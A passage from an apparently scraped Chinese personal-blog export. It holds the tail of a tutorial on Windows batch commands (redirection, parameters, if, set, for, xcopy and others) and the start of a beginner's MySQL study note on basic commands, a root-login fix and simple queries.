class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">21 tree</span><br><span class=\"line\">显示目录结构</span><br><span class=\"line\">tree d: #显示D盘的文件目录结构</span><br><span class=\"line\"></span><br><span class=\"line\">22 &amp;</span><br><span class=\"line\">顺序执行多条命令，而不管命令是否执行成功</span><br><span class=\"line\"></span><br><span class=\"line\">23 &amp;&amp;</span><br><span class=\"line\">顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令</span><br><span class=\"line\">find &quot;ok&quot; c:test.txt &amp;&amp; echo 成功</span><br><span class=\"line\">如果找到了&quot;ok&quot;字样，就显示&quot;成功&quot;，找不到就不显示</span><br><span class=\"line\"></span><br><span class=\"line\">24 ||</span><br><span class=\"line\">顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</span><br><span class=\"line\">find &quot;ok&quot; c:test.txt || echo 不成功</span><br><span class=\"line\">如果找不到&quot;ok&quot;字样，就显示&quot;不成功&quot;，找到了就不显示</span><br><span class=\"line\"></span><br><span class=\"line\">25 |</span><br><span class=\"line\">管道命令</span><br><span class=\"line\">dir *.* /s/a | find /c &quot;.exe&quot;</span><br><span class=\"line\">管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令</span><br><span class=\"line\">该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数</span><br><span class=\"line\">type c:test.txt|more</span><br><span class=\"line\">这个和 more c:test.txt 的效果是一样的</span><br><span class=\"line\"></span><br><span class=\"line\">26 &gt; 和 &gt;&gt;</span><br><span class=\"line\">输出重定向命令</span><br><span class=\"line\">&gt; 清除文件中原有的内容后再写入</span><br><span class=\"line\">&gt;&gt; 追加内容到文件末尾，而不会清除原有的内容</span><br><span class=\"line\">主要将本来显示在屏幕上的内容输出到指定文件中</span><br><span class=\"line\">指定文件如果不存在，则自动生成该文件</span><br><span class=\"line\">type c:test.txt &gt;prn</span><br><span class=\"line\">屏幕上不显示文件内容，转向输出到打印机</span><br><span class=\"line\">echo hello world&gt;con</span><br><span class=\"line\">在屏幕上显示hello world，实际上所有输出都是默认 &gt;con 的</span><br><span class=\"line\">copy c:test.txt f: &gt;nul</span><br><span class=\"line\">拷贝文件，并且不显示&quot;文件复制成功&quot;的提示信息，但如果f盘不存在，还是会显示出错信息</span><br><span class=\"line\">copy c:test.txt f: &gt;nul 2&gt;nul</span><br><span class=\"line\">不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息</span><br><span class=\"line\">echo ^^W ^&gt; ^W&gt;c:test.txt</span><br><span class=\"line\">生成的文件内容为 ^W &gt; W</span><br><span class=\"line\">^ 和 &gt; 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号</span><br><span class=\"line\"></span><br><span class=\"line\">27 &lt;</span><br><span class=\"line\">从文件中获得输入信息，而不是从屏幕上</span><br><span class=\"line\">一般用于 date time label 等需要等待输入的命令</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">echo 2005-05-01&gt;temp.txt</span><br><span class=\"line\">date &lt;temp.txt</span><br><span class=\"line\">del temp.txt</span><br><span class=\"line\">这样就可以不等待输入直接修改当前日期</span><br><span class=\"line\"></span><br><span class=\"line\">28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*</span><br><span class=\"line\">命令行传递给批处理的参数  //上一个命令的结果作为参数</span><br><span class=\"line\">%0 批处理文件本身</span><br><span class=\"line\">%1 第一个参数</span><br><span class=\"line\">%9 第九个参数</span><br><span class=\"line\">%* 从第一个参数开始的所有参数</span><br><span class=\"line\">批参数(%n)的替代已被增强。您可以使用以下语法:</span><br><span class=\"line\">%~1 - 删除引号(&quot; )， 扩充 %1</span><br><span class=\"line\">%~f1 - 将 %1 扩充到一个完全合格的路径名</span><br><span class=\"line\">%~d1 - 仅将 %1 扩充到一个驱动器号</span><br><span class=\"line\">%~p1 - 仅将 %1 扩充到一个路径</span><br><span class=\"line\">%~n1 - 仅将 %1 扩充到一个文件名</span><br><span class=\"line\">%~x1 - 仅将 %1 扩充到一个文件扩展名</span><br><span class=\"line\">%~s1 - 扩充的路径指含有短名</span><br><span class=\"line\">%~a1 - 将 %1 扩充到文件属性</span><br><span class=\"line\">%~t1 - 将 %1 扩充到文件的日期/时间</span><br><span class=\"line\">%~z1 - 将 %1 扩充到文件的大小</span><br><span class=\"line\">%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1</span><br><span class=\"line\">扩充到找到的第一个完全合格的名称。如果环境</span><br><span class=\"line\">变量名未被定义，或者没有找到文件，此组合键会</span><br><span class=\"line\">扩充到空字符串</span><br><span class=\"line\">可以组合修定符来取得多重结果:</span><br><span class=\"line\">%~dp1 - 只将 %1 扩展到驱动器号和路径</span><br><span class=\"line\">%~nx1 - 只将 %1 扩展到文件名和扩展名</span><br><span class=\"line\">%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，</span><br><span class=\"line\">并扩展到找到的第一个文件的驱动器号和路径。</span><br><span class=\"line\">%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。</span><br><span class=\"line\">可以参照 call/? 或 for/? 看出每个参数的含意</span><br><span class=\"line\">echo load &quot;%%1&quot; &quot;%%2&quot;&gt;c:test.txt</span><br><span class=\"line\">生成的文件内容为 load &quot;%1&quot;  &quot;%2&quot;</span><br><span class=\"line\">批处理文件里，用这个格式把命令行参数输出到文件</span><br><span class=\"line\"></span><br><span class=\"line\">29 if</span><br><span class=\"line\">判断命令</span><br><span class=\"line\">if &quot;%1&quot;==&quot;/a&quot; echo 第一个参数是/a</span><br><span class=\"line\">if /i &quot;%1&quot; equ &quot;/a&quot; echo 第一个参数是/a</span><br><span class=\"line\">/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?</span><br><span class=\"line\">if exist c:test.bat echo 存在c:test.bat文件</span><br><span class=\"line\">if not exist c:windows (</span><br><span class=\"line\">echo 不存在c:windows文件夹</span><br><span class=\"line\">)</span><br><span class=\"line\">if exist c:test.bat (</span><br><span class=\"line\">echo 存在c:test.bat</span><br><span class=\"line\">) else (</span><br><span class=\"line\">echo 不存在c:test.bat</span><br><span class=\"line\">)</span><br><span class=\"line\">30 setlocal 和 endlocal</span><br><span class=\"line\">设置”命令扩展名”和”延缓环境变量扩充”</span><br><span class=\"line\">SETLOCAL ENABLEEXTENSIONS #启用&quot;命令扩展名&quot;</span><br><span class=\"line\">SETLOCAL DISABLEEXTENSIONS #停用&quot;命令扩展名&quot;</span><br><span class=\"line\">SETLOCAL ENABLEDELAYEDEXPANSION #启用&quot;延缓环境变量扩充&quot;</span><br><span class=\"line\">SETLOCAL DISABLEDELAYEDEXPANSION #停用&quot;延缓环境变量扩充&quot;</span><br><span class=\"line\">ENDLOCAL #恢复到使用SETLOCAL语句以前的状态</span><br><span class=\"line\">“命令扩展名”默认为启用</span><br><span class=\"line\">“延缓环境变量扩充”默认为停用</span><br><span class=\"line\">批处理结束系统会自动恢复默认值</span><br><span class=\"line\">可以修改注册表以禁用&quot;命令扩展名&quot;，详见 cmd /? 。所以用到&quot;命令扩展名&quot;的程</span><br><span class=\"line\">序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确</span><br><span class=\"line\">保程序能在其它系统上正确运行</span><br><span class=\"line\">&quot;延缓环境变量扩充&quot;主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"命令31-39\"><a href=\"#命令31-39\" class=\"headerlink\" title=\"命令31~39\"></a>命令31~39</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">31 set</span><br><span class=\"line\">设置变量</span><br><span class=\"line\">引用变量可在变量名前后加 % ，即 %变量名%</span><br><span class=\"line\">set #显示目前所有可用的变量，包括系统变量和自定义的变量</span><br><span class=\"line\">echo %SystemDrive% #显示系统盘盘符。系统变量可以直接引用</span><br><span class=\"line\">set p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1</span><br><span class=\"line\">set p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2</span><br><span class=\"line\">echo %p% #显示变量p代表的字符串，即aa1bb1aa2bb2</span><br><span class=\"line\">echo %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2</span><br><span class=\"line\">echo %p:~6,3% #显示第6个字符以后的3个字符，即aa2</span><br><span class=\"line\">echo %p:~0,3% #显示前3个字符，即aa1</span><br><span class=\"line\">echo %p:~-2% #显示最后面的2个字符，即b2</span><br><span class=\"line\">echo %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b</span><br><span class=\"line\">echo %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2</span><br><span class=\"line\">echo %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2</span><br><span class=\"line\">echo %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2</span><br><span class=\"line\">set p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2</span><br><span class=\"line\">set /a p=39 #设置p为数值型变量，值为39</span><br><span class=\"line\">set /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3</span><br><span class=\"line\">set /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用</span><br><span class=\"line\">set /a p=”1&amp;0″ #”与”运算，要加引号。其它支持的运算符参见set/?</span><br><span class=\"line\">set p= #取消p变量</span><br><span class=\"line\">set /p p=请输入</span><br><span class=\"line\">屏幕上显示”请输入”，并会将输入的字符串赋值给变量p</span><br><span class=\"line\">注意这条可以用来取代 choice 命令</span><br><span class=\"line\">注意变量在 if 和 for 的复合语句里是一次性全部替换的，如</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">set p=aaa</span><br><span class=\"line\">if %p%==aaa (</span><br><span class=\"line\">echo %p%</span><br><span class=\"line\">set p=bbb</span><br><span class=\"line\">echo %p%</span><br><span class=\"line\">)</span><br><span class=\"line\">结果将显示</span><br><span class=\"line\">aaa</span><br><span class=\"line\">aaa</span><br><span class=\"line\">因为在读取 if 语句时已经将所有 %p% 替换为aaa</span><br><span class=\"line\">这里的&quot;替换&quot;，在 /? 帮助里就是指&quot;扩充&quot;、&quot;环境变量扩充&quot;</span><br><span class=\"line\">可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">SETLOCAL ENABLEDELAYEDEXPANSION</span><br><span class=\"line\">set p=aaa</span><br><span class=\"line\">if %p%==aaa (</span><br><span class=\"line\">echo %p%</span><br><span class=\"line\">set p=bbb</span><br><span class=\"line\">echo !p!</span><br><span class=\"line\">)</span><br><span class=\"line\">ENDLOCAL</span><br><span class=\"line\">结果将显示</span><br><span class=\"line\">aaa</span><br><span class=\"line\">bbb</span><br><span class=\"line\">还有几个动态变量，运行 set 看不到</span><br><span class=\"line\">%CD% #代表当前目录的字符串</span><br><span class=\"line\">%DATE% #当前日期</span><br><span class=\"line\">%TIME% #当前时间</span><br><span class=\"line\">%RANDOM% #随机整数，介于0~32767</span><br><span class=\"line\">%ERRORLEVEL% #当前 ERRORLEVEL 值</span><br><span class=\"line\">%CMDEXTVERSION% #当前命令处理器扩展名版本号</span><br><span class=\"line\">%CMDCMDLINE% #调用命令处理器的原始命令行</span><br><span class=\"line\">可以用echo命令查看每个变量值，如 echo %time%</span><br><span class=\"line\">注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到</span><br><span class=\"line\"></span><br><span class=\"line\">32 start</span><br><span class=\"line\">批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令</span><br><span class=\"line\"></span><br><span class=\"line\">33 call</span><br><span class=\"line\">批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行</span><br><span class=\"line\">有时有的应用程序用start调用出错的，也可以call调用</span><br><span class=\"line\"></span><br><span class=\"line\">34 choice (外部命令)</span><br><span class=\"line\">选择命令</span><br><span class=\"line\">让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……</span><br><span class=\"line\">win98里是choice.com</span><br><span class=\"line\">win2000pro里没有，可以从win98里拷过来</span><br><span class=\"line\">win2003里是choice.exe</span><br><span class=\"line\">choice /N /C y /T 5 /D y&gt;nul</span><br><span class=\"line\">延时5秒</span><br><span class=\"line\"></span><br><span class=\"line\">35 assoc 和 ftype</span><br><span class=\"line\">文件关联</span><br><span class=\"line\">assoc 设置&#x27;文件扩展名&#x27;关联，关联到&#x27;文件类型&#x27;</span><br><span class=\"line\">ftype 设置&#x27;文件类型&#x27;关联，关联到&#x27;执行程序和参数&#x27;</span><br><span class=\"line\">当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开</span><br><span class=\"line\">而是先判断.txt属于 txtfile &#x27;文件类型&#x27;</span><br><span class=\"line\">再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1</span><br><span class=\"line\">可以在&quot;文件夹选项&quot;→&quot;文件类型&quot;里修改这2种关联</span><br><span class=\"line\">assoc #显示所有&#x27;文件扩展名&#x27;关联</span><br><span class=\"line\">assoc .txt #显示.txt代表的&#x27;文件类型&#x27;，结果显示 .txt=txtfile</span><br><span class=\"line\">assoc .doc #显示.doc代表的&#x27;文件类型&#x27;，结果显示 .doc=Word.Document.8</span><br><span class=\"line\">assoc .exe #显示.exe代表的&#x27;文件类型&#x27;，结果显示 .exe=exefile</span><br><span class=\"line\">ftype #显示所有&#x27;文件类型&#x27;关联</span><br><span class=\"line\">ftype exefile #显示exefile类型关联的命令行，结果显示 exefile=&quot;%1&quot; %*</span><br><span class=\"line\">assoc .txt=Word.Document.8</span><br><span class=\"line\">设置.txt为word类型的文档，可以看到.txt文件的图标都变了</span><br><span class=\"line\">assoc .txt=txtfile</span><br><span class=\"line\">恢复.txt的正确关联</span><br><span class=\"line\">ftype exefile=&quot;%1&quot; %*</span><br><span class=\"line\">恢复 exefile 的正确关联</span><br><span class=\"line\">如果该关联已经被破坏，可以运行 command.com ，再输入这条命令</span><br><span class=\"line\"></span><br><span class=\"line\">36 pushd 和 popd</span><br><span class=\"line\">切换当前目录</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">c: &amp; cd &amp; md mp3 #在 C: 建立 mp3 文件夹</span><br><span class=\"line\">md d:mp4 #在 D: 建立 mp4 文件夹</span><br><span class=\"line\">cd /d d:mp4 #更改当前目录为 d:mp4</span><br><span class=\"line\">pushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3</span><br><span class=\"line\">popd #恢复当前目录为刚才保存的 d:mp4</span><br><span class=\"line\"></span><br><span class=\"line\">37 for</span><br><span class=\"line\">循环命令</span><br><span class=\"line\">这个比较复杂，请对照 for/? 来看</span><br><span class=\"line\">for %%i in (c: d: e: f:) do echo %%i</span><br><span class=\"line\">依次调用小括号里的每个字符串，执行 do 后面的命令</span><br><span class=\"line\">注意%%i，在批处理中 for 语句调用参数用2个%</span><br><span class=\"line\">默认的字符串分隔符是&quot;空格键&quot;，&quot;Tab键&quot;，&quot;回车键&quot;</span><br><span class=\"line\">for %%i in (*.txt) do find &quot;abc&quot; %%i</span><br><span class=\"line\">对当前目录里所有的txt文件执行 find 命令</span><br><span class=\"line\">for /r . %%i in (*.txt) do find &quot;abc&quot; %%i</span><br><span class=\"line\">在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行</span><br><span class=\"line\">for /r . %%i in (.) do echo %%~pni</span><br><span class=\"line\">显示当前目录名和所有子目录名，包括路径，不包括盘符</span><br><span class=\"line\">for /r d:mp3 %%i in (*.mp3) do echo %%i&gt;&gt;d:mp3.txt</span><br><span class=\"line\">把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去</span><br><span class=\"line\">for /l %%i in (2,1,8) do echo %%i</span><br><span class=\"line\">生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1</span><br><span class=\"line\">for /f %%i in (&#x27;set&#x27;) do echo %%i</span><br><span class=\"line\">对 set 命令的输出结果循环调用，每行一个</span><br><span class=\"line\">for /f &quot;eol=P&quot; %%i in (&#x27;set&#x27;) do echo %%i</span><br><span class=\"line\">取 set 命令的输出结果，忽略以 P 开头的那几行</span><br><span class=\"line\">for /f %%i in (d:mp3.txt) do echo %%i</span><br><span class=\"line\">显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称</span><br><span class=\"line\">for /f &quot;delims=&quot; %%i in (d:mp3.txt) do echo %%i</span><br><span class=\"line\">显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称</span><br><span class=\"line\">for /f &quot;skip=5 tokens=4&quot; %%a in (&#x27;dir&#x27;) do echo %%a</span><br><span class=\"line\">对 dir 命令的结果，跳过前面5行，余下的每行取第4列</span><br><span class=\"line\">每列之间的分隔符为默认的&quot;空格&quot;</span><br><span class=\"line\">可以注意到 dir 命令输出的前5行是没有文件名的</span><br><span class=\"line\">for /f &quot;tokens=1,2,3 delims=- &quot; %%a in (&#x27;date /t&#x27;) do (</span><br><span class=\"line\">echo %%a</span><br><span class=\"line\">echo %%b</span><br><span class=\"line\">echo %%c</span><br><span class=\"line\">)</span><br><span class=\"line\">对 date /t 的输出结果，每行取1、2、3列</span><br><span class=\"line\">第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列</span><br><span class=\"line\">分隔符指定为 - 和&quot;空格&quot;，注意 delims=- 后面有个&quot;空格&quot;</span><br><span class=\"line\">其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的</span><br><span class=\"line\">for /f &quot;tokens=2* delims=- &quot; %%a in (&#x27;date /t&#x27;) do echo %%b</span><br><span class=\"line\">取第2列给 %%a ，其后的列都给 %%b</span><br><span class=\"line\"></span><br><span class=\"line\">38 subst (外部命令)</span><br><span class=\"line\">映射磁盘。</span><br><span class=\"line\">subst z: serverd #这样输入z:就可以访问serverd了</span><br><span class=\"line\">subst z: /d #取消该映射</span><br><span class=\"line\">subst #显示目前所有的映时</span><br><span class=\"line\"></span><br><span class=\"line\">39 xcopy (外部命令)</span><br><span class=\"line\">文件拷贝</span><br><span class=\"line\">xcopy d:mp3 e:mp3 /s/e/i/y</span><br><span class=\"line\">复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件</span><br><span class=\"line\">加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问</span><br></pre></td></tr></table></figure>"},{"title":"MYSQL学习（一）","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_13.jpg","top":false,"_content":"\n# 数据库的学习（一）\n\n- [相关视频链接](https://www.bilibili.com/video/BV12b411K7Zu/?p=28)\n\n## 数据库及其概念\n\n- DB 数据库\n- DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB\n- SQL  管理数据库的语言，几乎被所有的DBMS支持\n- DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令\n\n<!--more-->\n\n### 数据库管理的特点\n\n1. 先将数据放到 “一张表” 中， 在将表放到仓库中\n2. 一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己\n3. 数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”\n4. 表是由列组成，也称为字段，相当与python中的  “属性”\n5. 表是按行储存的，每一行相当与python中的  ”对象“\n\n- 端口号port 3306\n\n### Linux 系统 Mysql 相关事项\n\n- 检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql --version\n\n- systemctl start mysql.service 启动  或者 service mysql start\n  systemctl stop mysql.service 停止  或者 service mysql stop \n  systemctl restart mysql.service 重启\n- 检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld\n [相关检查操作链接](https://blog.csdn.net/qq_31083947/article/details/90248565)\n\n### 数据库常用命令\n\n1. 进入管理系统时时查看有那些数据库\n\n```\nshow databases;\n```\n\n2. 进入库\n\n```\nuse 库的名称;\n```\n\n3. 查看库里有哪些表\n\n```\nshow tables;\n```\n\n4. 从现在所在的库中查看别的库中存有的表\n\n```\nshow tables from 库的名称;\n```\n\n5. 查看现在在哪个库\n\n```\nselect database();\n```\n\n6. 查看表的内容\n\n```\ndesc 表的名称;\n```\n\n7. 创建表\n\n```\ncreate table 表名（\n\t列名 列类型，\n\t列名 列类型，\n\t...\n)\n```\n\n\n\n### SQL语法规范\n\n1. 不区分大小写，但建议关键字大写，表名，列名小写\n2. 每行命令u最好用分号结尾\n3. 每行命令根据需要，可以进行缩进，或换行\n4. SQL语法中索引从1开始\n5. 注释 \n\n- 单行注释：#注释文字\n- 单行注释：-- 注释文字（注意横杠后面有空格）\n- 多行注释：/× 注释文字 ×/\n\n### 使用 DBMS 图形化界面以及命令行登录时出现错误解决\n\n- [原文链接](https://www.cnblogs.com/leolztang/p/5094930.html)\n\n```\n~$ mysql -u root -p\nEnter password: \nERROR 1698 (28000): Access denied for user 'root'@'localhost'\n```\n\n- 解决\n\n```\n# 强制登录\nsudo mysql\n\nselect user, plugin from mysql.user;\n\nupdate mysql.user set authentication_string=PASSWORD('hero1314'), plugin='mysql_native_password' where user='root';\n\nflush privileges;\n\nsudo service mysql restart\n```\n\n\n\n## 数据库语言的学习\n\n### DQL语言的学习\n\n#### 1、基础查询\n\n- 语法\n\n```\nselect 查询列表 from 表名;\n```\n\n- 特点：\n\n1. 查询列表可以是：表中的字段，常量值，表达式，函数\n2. 查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已\n\n- 查询字段\n\n```\nselect 字段一，字段二 from 表格;    //字段之间用逗号隔开\nselect * from 表格;  // 查询所有字段\n```\n\n- 着重号 `  （1的旁边的那个），用来标识字段\n\n- 查询常量值：select ' 字符或字符串 ’ ;\n\n- 起别名\n\n  ​\t别名有空格时，应用空格将别名括起来\n  \n  ​\t注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 \n\n```\nselect 字段值 as 别名;  // as可以省略\n```\n\n- 去重：在被查询的字段之前加上关键字 distinct\n- \\+ 号的作用\n\n```\nselect 100+90; // 俩个操作数都为数值型，则做加法运算\n# 结果：190\nselect '100'+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算\n# 结果：190\nselect null+10; //若有一个方为null，则结果肯定为null\n```\n\n\n\n- ifnull( ) 函数\n\n```\nselect IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值\n```\n\n\n\n#### 2、条件查询\n\n- 语法：\n\n```\nselect 查询列表 from 表名 where 筛选条件;\n```\n\n- 分类：\n\n1. 按表达条件筛选：\n\n   ​\t\t逻辑运算符：> , <, =, <> , <=, >=\n\n   